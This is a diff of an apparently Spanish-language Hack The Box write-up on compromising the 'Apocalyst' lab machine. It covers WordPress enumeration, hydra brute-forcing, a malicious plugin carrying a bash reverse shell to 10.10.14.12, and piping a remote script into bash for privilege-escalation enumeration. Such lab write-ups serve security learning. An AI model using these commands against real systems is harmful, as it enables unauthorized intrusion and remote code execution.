@@ -1,4 +1,24 @@
+---
+layout: single
+title: TwoMillion - Hack The Box
+excerpt: "Explotación de Api"
+date: 2024-01-03
+classes: wide
+header:
+  teaser: /assets/images/htb-apocalyst/apocalyst1.png
+categories:
+  - hackthebox
+  - writeup
+tags:
+  - hackthebox
+  - nginx
+  - API
+  - kernel
+---
+
 # 10.10.10.46 - Apocalist
+
+![](/assets/images/htb-apocalyst/apocalyst1.png)
 
 ------------------------------
 # Reconocimiento inicial
@@ -18,7 +38,7 @@ $: sudo nmap -sCV 10.10.10.46 -p- --open -sS --min-rate 5000 -Pn -n -vvv
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Luego un script mío personalizado para obtener mas información y whatweb
+Luego un [script mío personalizado](https://github.com/jessica-diaz-ciber/Pentesting-tools/blob/main/python_portscanner.md) para obtener mas información y whatweb
 
 ```bash
 $: portscan.py -t 10.10.10.46 -p 22,80
@@ -42,6 +62,7 @@ http://apocalyst.htb/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTT
 ```
 
 Sin lugar a duda tenemos un worpress 4.8. En el `/etc/hosts` escribimos la linea `10.10.10.46	apocalyst.htb`
+![](/assets/images/htb-apocalyst/apocalyst2.png)
 Encontramos un articulo escrito por un tal `falaraki`, adenás en el código fuente estos links
 ```bash
 $: curl -s http://apocalyst.htb/ | grep -oP 'a href="(.*?)"' | grep "apocalyst" | sort -u
@@ -87,8 +108,9 @@ Nos ha encontrado lo del usaurio `falaraki` y que el `xmlrpc` está activado, si
 
 # Explotación de la web
 
-En `/wp-login`, si pruebo un usuario `test` da un mensaje de error, pero con un usuario del sitio (el `falaraki` de antes) da otro mensaje distinto, lo
- que deja la puerta abierta a fuerza bruta con hydra, pero con el rockyou no obtendo resultados.
+En `/wp-login`, si pruebo un usuario `test` da un mensaje de error, pero con un usuario del sitio (el `falaraki` de antes) da otro mensaje distinto,
+lo que deja la puerta abierta a fuerza bruta con hydra, pero con el rockyou no obtendo resultados.
+![](/assets/images/htb-apocalyst/apocalyst3.png)
 
 ```bash
 $: hydra -l falaraki -P /usr/share/wordlists/rockyou.txt apocalyst.htb http-post-form \
@@ -138,8 +160,9 @@ $: wfuzz --hc=404 -L -w dict.txt http://apocalyst.htb/FUZZ
 $: wfuzz --hc=404 --hw=17 -L -w dict.txt http://apocalyst.htb/FUZZ
 000000465:   200        14 L     20 W       175 Ch      "Rightiousness"
 ```
-
 Una imagen descargada de `/Rightiousness` ocupa mas que otrea por ejemplo de `/End`
+![](/assets/images/htb-apocalyst/apocalyst4.png)
+
 ```bash
 $: ls -la
 .rw-r--r-- jessica jessica 210 KB Tue Jan  9 11:22:24 2024  Rightiousness.jpg
@@ -178,6 +201,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'"); ?>
 ```
 2. Lo zipeamos `zip plugin.zip revsel.php`
 3. Lo subimos, le damos a activar y recibimos la shell
+![](/assets/images/htb-apocalyst/apocalyst5.png)
 ```bash
 $: sudo nc -nlvp 443
 [sudo] password for jessica:
@@ -192,8 +216,7 @@ www-data@apocalyst:/var/www/html/apocalyst.htb/wp-admin$
 
 # Escalada de privilegios
 
-
-Subo mi herramienta de enumeración linux y encuentro que tenemos tanto la contraseña de la base de datos de wordpress (posiblemente la contraseña
+Subo [mi herramienta de enumeración linux](https://github.com/jessica-diaz-ciber/Pentesting-tools/blob/main/lin_info.sh) y encuentro que tenemos tanto la contraseña de la base de datos de wordpress (posiblemente la contraseña
 de falaraki encriptada) y que el `/etc/passwd` tiene permisos de escritura, lo que nos regala la escalda de privilegios
 ```bash
 www-data@apocalyst:/var/www/html/apocalyst.htb$ curl http://10.10.14.12/lin_info.sh | bash
